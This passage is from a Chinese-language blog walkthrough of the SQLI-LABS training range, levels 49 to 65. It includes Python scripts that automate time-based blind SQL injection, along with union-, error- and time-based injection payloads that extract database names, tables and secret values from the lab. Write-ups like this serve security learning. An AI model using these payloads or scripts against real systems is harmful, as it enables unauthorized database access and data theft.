class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    start = time.time()</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    url = &#x27;http://101.35.96.6:8000/Less-49/?sort=&#x27;</span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    database = &#x27;&#x27;</span><br><span class="line">    database_length = 8</span><br><span class="line">    threads_num = 4</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=progress_bar,args=(threads_num,database_length))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    for i in range(1, 9):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line">    for i in range(threads_num):</span><br><span class="line">        t = threading.Thread(target=findpass, args=(q, url, key,))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    for i in sorted(key):</span><br><span class="line">        database = database + key[i]</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    print(f&quot;数据库------&gt;&gt;&#123;database&#125;,耗时 &#123;end - start&#125;s&quot;)</span><br><span class="line"></span><br><span class="line">def progress_bar(time_progress,database_length):</span><br><span class="line">    def progress(percent):</span><br><span class="line">        if percent &gt; 1:</span><br><span class="line">            percent = 1</span><br><span class="line">        res = int(50 * percent) * &#x27;#&#x27;</span><br><span class="line">        print(&#x27;\r[%-50s] %d%%&#x27; % (res, int(100 * percent)), end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    recv_size = 0</span><br><span class="line">    total_size = database_length</span><br><span class="line">    while recv_size &lt; total_size:</span><br><span class="line">        time.sleep(time_progress)  </span><br><span class="line">        recv_size += time_progress</span><br><span class="line">        percent = recv_size </span><br><span class="line">        progress(percent)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">def findpass(q,url,key):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        i=q.get()</span><br><span class="line">        min = 32    </span><br><span class="line">        max = 126   </span><br><span class="line">        mid = (min + max) // 2</span><br><span class="line">        while min &lt; max:</span><br><span class="line">            payload = f&quot;1&#x27; and if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)--+&quot;</span><br><span class="line">            try:</span><br><span class="line">                req = requests.get(url=url+payload, timeout=1)</span><br><span class="line">            except requests.exceptions.Timeout as e:</span><br><span class="line">                min = mid + 1</span><br><span class="line">                mid=(min+max)//2    </span><br><span class="line">                continue</span><br><span class="line">            max = mid</span><br><span class="line">            mid = (min + max) // 2</span><br><span class="line">        key[i]=chr(mid)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208051822919.png" alt="image-20220805182246844"></p>
<h4 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h4><p>这关我们用盲注来检测闭合符，发现这关为数值型注入</p>
<p><strong>盲注测试闭合：</strong>1 and (if(length(database())&#x3D;8,sleep(1),0)) –+</p>
<p>而且能返回数据信息，所以我们使用报错注入来做</p>
<p><strong>爆数据库</strong>：1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071200774.png" alt="image-20220807120017667"></p>
<h4 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h4><p>这关我们同样使用盲注来检测闭合符，发现闭合符为’</p>
<p>和50关一样使用报错注入即可</p>
<p><strong>爆数据库</strong>：1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071458422.png" alt="image-20220807145848361"></p>
<h4 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h4><p>这关不管输什么闭合都报错，所以初步判断为数值注入</p>
<p>用盲注进行测试同样也证实了本关为数值注入</p>
<p>那么我们直接用盲注即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    start = time.time()</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    url = &#x27;http://101.35.96.6:8000/Less-52/?sort=&#x27;</span><br><span class="line">    database_length = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload_database_length = f&quot;1 and(if(length(database())=&#123;database_length&#125;,sleep(1),0))--+&quot;</span><br><span class="line">        try:</span><br><span class="line">            req = requests.get(url=url + payload_database_length, timeout=1)</span><br><span class="line">            database_length += 1</span><br><span class="line">        except requests.exceptions.Timeout as e:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    database = &#x27;&#x27;</span><br><span class="line">    threads_num = 4</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    for i in range(1, database_length+1):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line">    for i in range(threads_num):</span><br><span class="line">        t = threading.Thread(target=findpass, args=(q, url, key,))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    for i in sorted(key):</span><br><span class="line">        database = database + key[i]</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    print(f&quot;数据库------&gt;&gt;&#123;database&#125;,耗时 &#123;end - start&#125;s&quot;)</span><br><span class="line"></span><br><span class="line">def findpass(q,url,key):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        i=q.get()</span><br><span class="line">        min = 32    #</span><br><span class="line">        max = 126   #</span><br><span class="line">        mid = (min + max) // 2</span><br><span class="line">        while min &lt; max:</span><br><span class="line">            payload = f&quot;1 and if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)--+&quot;</span><br><span class="line">            try:</span><br><span class="line">                req = requests.get(url=url+payload, timeout=1)</span><br><span class="line">            except requests.exceptions.Timeout as e:</span><br><span class="line">                min = mid + 1</span><br><span class="line">                mid=(min+max)//2</span><br><span class="line">                continue</span><br><span class="line">            max = mid</span><br><span class="line">            mid = (min + max) // 2</span><br><span class="line">        key[i]=chr(mid)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071502685.png" alt="image-20220807150201609"></p>
<h4 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h4><p>这关同样用盲注来检测闭合符，闭合符为单引号</p>
<p>直接用盲注的exp跑一下就行</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071552198.png" alt="image-20220807155204119"></p>
<h2 id="项目四-Challenges"><a href="#项目四-Challenges" class="headerlink" title="项目四(Challenges)"></a>项目四(Challenges)</h2><h4 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h4><p>这关主要是有随机值还有每10次尝试都会把数据全部更新一遍</p>
<p>这一关成功找到了闭合符为’</p>
<p><strong>查表名</strong>：-1’ union select 1,2,(select table_name from information_schema.tables where table_schema&#x3D;database())–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208091958726.png" alt="image-20220809195840611"></p>
<p><strong>查字段</strong></p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208091959642.png" alt="image-20220809195906560"></p>
<p><strong>查值</strong>：-1’ union select 1,2,(select group_concat(concat_ws(‘~’,id,sessid,secret_W1ZS,tryy<br>)) from  O4D9YCZRLT)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208092002286.png" alt="image-20220809200256204"></p>
<h4 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h4><p>这个关主要是新的闭合符(</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100832882.png" alt="image-20220810083156744"></p>
<p><strong>爆数据库</strong>：-1) union select 1,2,(select group_concat(schema_name) from information_schema.schemata)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100833244.png" alt="image-20220810083352171"></p>
<p><strong>爆表名</strong>-1) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100834202.png" alt="image-20220810083452126"></p>
<p><strong>爆字段</strong>：-1) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘A3FU06FGMW’)–+<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100836234.png" alt="image-20220810083602162"></p>
<p><strong>爆值</strong>：-1) union select 1,2,(select group_concat(concat_ws(‘~’,id,sessid,secret_9IL3,tryy)) from A3FU06FGMW)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100837941.png" alt="image-20220810083720869"></p>
<h4 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h4><p>这关输入闭合符时，只有单引号无回显，其他均有回显，但输入and 1&#x3D;1 时并无回显，所以我们试试’) 发现成功回显</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100841439.png" alt="image-20220810084145367"></p>
<p><strong>爆数据库</strong>：-1’) union select 1,2,(select group_concat(schema_name) from information_schema.schemata) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100842473.png" alt="image-20220810084252402"></p>
<h4 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h4><p>这关进行闭合符测试中，闭合符为“</p>
<p><strong>爆数据库</strong>：-1” union select 1,2,(select group_concat(schema_name) from information_schema.schemata) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100846548.png" alt="image-20220810084615475"></p>
<h4 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h4><p>这题主要是找到了闭合符后，却不能回显数据，只能报错注入</p>
<p><strong>爆数据库</strong>：1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100855849.png" alt="image-20220810085545781"></p>
<h4 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h4><p>这题和上题一样不过为数值型报错注入</p>
<p><strong>爆数据库：</strong>1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100857071.png" alt="image-20220810085738994"></p>
<h4 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h4><p>这题我们用\试出了闭合符为”)</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100859127.png" alt="image-20220810085904057"></p>
<p>同样再用报错注入</p>
<p><strong>爆数据库：</strong>1”) and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100859034.png" alt="image-20220810085954954"></p>
<h4 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h4><p>这题我们同样用\试出了闭合符为’)),接下来还是用报错注入</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100901931.png" alt="image-20220810090124863"></p>
<h4 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h4><p>这题告诉了我们130次以内，这么次数那么肯定就是盲注了</p>
<p>不过130次跑盲注对于脚本来说还是太少了。所以手工注入一下就行</p>
<p>id&#x3D;1’) and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100910060.png" alt="image-20220810091051986"></p>
<h4 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h4><p>这题经过尝试后，闭合符为’</p>
<p>1’ and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100915920.png" alt="image-20220810091525829"></p>
<h4 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h4><p>这关同样为盲注，不过试了闭合符一直没试出来，看了wp后发现为))</p>
<p>1)) and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100919989.png" alt="image-20220810091901915"></p>
<h4 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h4><p>这题闭合符为”)</p>
<p>1”) and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100921937.png" alt="image-20220810092131857"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">虚幻无实</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/">http://example.com/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">虚幻无实</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/06/CTFshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><img class="prev-cover" src="https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTFshow-web入门-命令执行（持续更新）</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/18/123/"><img class="next-cover" src="https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTFhub - SQL注入-2</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207212023398.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">虚幻无实</div><div class="author-info__description">知其黑，守其白</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xiajiajun233?tab=repositories" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:911147426@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLI-LABS%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">SQLI-LABS靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E4%B8%80-Advanced-Injections"><span class="toc-number">1.1.</span> <span class="toc-text">项目一(Advanced Injections)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">sql基础知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1%EF%BC%9A"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">Less-1：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-2%EF%BC%9A"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Less-2：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">1.1.1.2.1.</span> <span class="toc-text">初步测试：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-3%EF%BC%9A"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">Less-3：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-4%EF%BC%9A"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">Less-4：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-5-8%EF%BC%9A"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">Less-5-8：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Less-6"><span class="toc-number">1.1.1.5.1.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Less-7"><span class="toc-number">1.1.1.5.2.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Less-8"><span class="toc-number">1.1.1.5.3.</span> <span class="toc-text">Less-8</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-9-10"><span class="toc-number">1.1.1.6.</span> <span class="toc-text">Less-9-10</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Less-10"><span class="toc-number">1.1.1.6.1.</span> <span class="toc-text">Less-10</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-11"><span class="toc-number">1.1.1.7.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-12%EF%BC%9A"><span class="toc-number">1.1.1.8.</span> <span class="toc-text">Less-12：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-13-14"><span class="toc-number">1.1.1.9.</span> <span class="toc-text">Less-13-14</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Less-14"><span class="toc-number">1.1.1.9.1.</span> <span class="toc-text">Less-14</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-15-16"><span class="toc-number">1.1.1.10.</span> <span class="toc-text">Less-15-16</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Less-15"><span class="toc-number">1.1.1.10.1.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Less-16"><span class="toc-number">1.1.1.10.2.</span> <span class="toc-text">Less-16</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-17"><span class="toc-number">1.1.1.11.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-18"><span class="toc-number">1.1.1.12.</span> <span class="toc-text">Less-18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-19"><span class="toc-number">1.1.1.13.</span> <span class="toc-text">Less-19</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-20"><span class="toc-number">1.1.1.14.</span> <span class="toc-text">Less-20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-21"><span class="toc-number">1.1.1.15.</span> <span class="toc-text">Less-21</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E4%BA%8C-Stacked-Injections"><span class="toc-number">1.2.</span> <span class="toc-text">项目二(Stacked Injections)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-23"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-24"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">Less-24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-25a%EF%BC%9A"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">Less-25a：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-26"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">Less-26</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-26a"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">Less-26a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-27"><span class="toc-number">1.2.0.6.</span> <span class="toc-text">Less-27</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-27a"><span class="toc-number">1.2.0.7.</span> <span class="toc-text">Less-27a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-28"><span class="toc-number">1.2.0.8.</span> <span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-28a"><span class="toc-number">1.2.0.9.</span> <span class="toc-text">Less-28a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-29"><span class="toc-number">1.2.0.10.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-30"><span class="toc-number">1.2.0.11.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-31"><span class="toc-number">1.2.0.12.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-32"><span class="toc-number">1.2.0.13.</span> <span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-33"><span class="toc-number">1.2.0.14.</span> <span class="toc-text">Less-33</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-34"><span class="toc-number">1.2.0.15.</span> <span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-35"><span class="toc-number">1.2.0.16.</span> <span class="toc-text">Less-35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-36"><span class="toc-number">1.2.0.17.</span> <span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-37"><span class="toc-number">1.2.0.18.</span> <span class="toc-text">Less-37</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E4%B8%89-Stacked-Injections"><span class="toc-number">1.3.</span> <span class="toc-text">项目三(Stacked Injections)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-38"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">Less-38</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-39"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">Less-39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-40"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">Less-40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-41"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">Less-41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-42"><span class="toc-number">1.3.0.5.</span> <span class="toc-text">Less-42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-43"><span class="toc-number">1.3.0.6.</span> <span class="toc-text">Less-43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-44"><span class="toc-number">1.3.0.7.</span> <span class="toc-text">Less-44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-45"><span class="toc-number">1.3.0.8.</span> <span class="toc-text">Less-45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-46"><span class="toc-number">1.3.0.9.</span> <span class="toc-text">Less-46</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-47"><span class="toc-number">1.3.0.10.</span> <span class="toc-text">Less-47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-48"><span class="toc-number">1.3.0.11.</span> <span class="toc-text">Less-48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-49"><span class="toc-number">1.3.0.12.</span> <span class="toc-text">Less-49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-50"><span class="toc-number">1.3.0.13.</span> <span class="toc-text">Less-50</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-51"><span class="toc-number">1.3.0.14.</span> <span class="toc-text">Less-51</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-52"><span class="toc-number">1.3.0.15.</span> <span class="toc-text">Less-52</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-53"><span class="toc-number">1.3.0.16.</span> <span class="toc-text">Less-53</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E5%9B%9B-Challenges"><span class="toc-number">1.4.</span> <span class="toc-text">项目四(Challenges)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-54"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-55"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-56"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-57"><span class="toc-number">1.4.0.4.</span> <span 